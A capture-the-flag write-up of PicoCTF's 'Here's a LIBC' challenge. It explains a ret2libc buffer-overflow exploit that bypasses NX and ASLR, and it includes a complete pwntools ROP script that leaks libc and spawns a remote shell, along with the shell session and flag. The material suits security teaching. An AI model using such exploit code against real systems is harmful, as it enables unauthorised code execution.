---
title: Ret2libc 64 bits (NX & ASLR)
description: Exploiting a buffer overflow using ret2libc with ASRL and NX enabled.
---

# Ret2libc 64 bits (NX & ASLR)

## Summary

Exploiting a buffer overflow using `ret2libc` with `ASRL` and `NX` enabled.

## Challenge

### Description

!!! note ""
    Challenge : [Here's a LIBC](https://play.picoctf.org/practice/challenge/179) from PicoCTF 2021.

I am once again asking for you to pwn this binary.

- [vuln](https://mercury.picoctf.net/static/58622771a398cdc12767c5caab84fcb9/vuln) [libc.so.6](https://mercury.picoctf.net/static/58622771a398cdc12767c5caab84fcb9/libc.so.6) [Makefile](https://mercury.picoctf.net/static/58622771a398cdc12767c5caab84fcb9/Makefile)
- `nc mercury.picoctf.net 24159`

## Writeup

We do not have access to the source code, however we have the binary and the `libc`.

Let's have a look at the binary :

```
$ pwn checksec vuln
[*] '.../picoctf/Heres_a_LIBC/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```

`NX` is enabled, so we can't run our shellcode on the stack. Also, `ASLR` is enabled on the remote TCP service.

To run the binary, I needed to remove a library with [patchelf](https://github.com/NixOS/patchelf).

```
$ ls
libc.so.6  vuln
$ ldd vuln
        linux-vdso.so.1 (0x00007ffc9eded000)
        libc.so.6 => ./libc.so.6 (0x00007f3b9fe00000)
        /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f3ba03e0000)
$ ./vuln
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!

$ patchelf --remove-rpath /lib64/ld-linux-x86-64.so.2 vuln
$ ./vuln
WeLcOmE To mY EcHo sErVeR!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAa
^C
```

Let's try to calculate the size of the padding of the buffer overflow. Source code :

```python
#!/usr/bin/env python3
from pwn import process, p64, cyclic, cyclic_find


PROGRAM = "./vuln"

def find_padding_size():
    proc = process(PROGRAM)
    pattern = cyclic(0xFF)

    proc.sendlineafter(b"WeLcOmE To mY EcHo sErVeR!\n", pattern)
    proc.wait()

    core = proc.corefile
    seg_addr = int(f"0x{hex(core.fault_addr)[-8:]}", 16)

    return cyclic_find(seg_addr)


if __name__ == "__main__":
    padding = find_padding_size()
    print("Padding size:", padding)
```

Execution :

```
$ python3 calc_padding.py
[+] Starting local process './vuln': pid 105001
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 105001)
[+] Parsing corefile...: Done
...
Padding size: 136
```

---

To bypass `NX`, we will use a ROPChain. To bypass `ASLR`, we will leak the address of a function (in the GOT) to calculate the base address of `libc` and call the `main` function again to executes our final payload with the right offsets. Source code :

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import remote, p64, u64, ELF


"""
0x0000000000400913: pop rdi; ret;
0x000000000040052e: ret;
"""

PADDING = 136
HOST, PORT = "mercury.picoctf.net", 24159

vuln = ELF("./vuln")
libc = ELF("./libc.so.6")

# Gadgets
pop_rdi  = p64(0x0000000000400913)
ret      = p64(0x000000000040052e)
puts_plt = p64(vuln.plt['puts'])
main_plt = p64(vuln.symbols['main'])
puts_got = p64(vuln.got['puts'])

# Leak puts address inside libc
payload = b"A" * PADDING
payload += pop_rdi
payload += puts_got
payload += puts_plt
payload += main_plt

# Send the first ROP
proc = remote(HOST, PORT)
proc.sendlineafter(b"WeLcOmE To mY EcHo sErVeR!", payload)

# Parse puts address from stdout 
proc.recvline()
proc.recvline()
puts_addr = proc.recvline().strip().ljust(8, b'\x00')
print(f"puts_addr: {puts_addr}")

# Calculate libc base address (offset diff)
libc.address = u64(puts_addr) - libc.symbols['puts']
bin_sh   = p64(next(libc.search(b'/bin/sh')))
system   = p64(libc.symbols['system'])

# Send the second ROP with the right offsets, system('/bin/sh')
payload = b"A" * PADDING
payload += ret # stack alignment, The MOVAPS issue on https://ropemporium.com/guide.html
payload += pop_rdi
payload += bin_sh
payload += system

proc.sendline(payload)
proc.interactive()
```

Execution :

```
$ python3 ret2libc.py
...
puts_addr: b'0Zy\x07\x18\x7f\x00\x00'
[*] Switching to interactive mode
WeLcOmE To mY EcHo sErVeR!
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd
$ id
uid=1560(here-s-a-libc_5) gid=1561(here-s-a-libc_5) groups=1561(here-s-a-libc_5)
$ cat flag.txt
picoCTF{1_<3_sm4sh_st4cking_cf205091ad15ab6d}[*] Got EOF while reading in interactive
$
[*] Closed connection to mercury.picoctf.net port 24159
```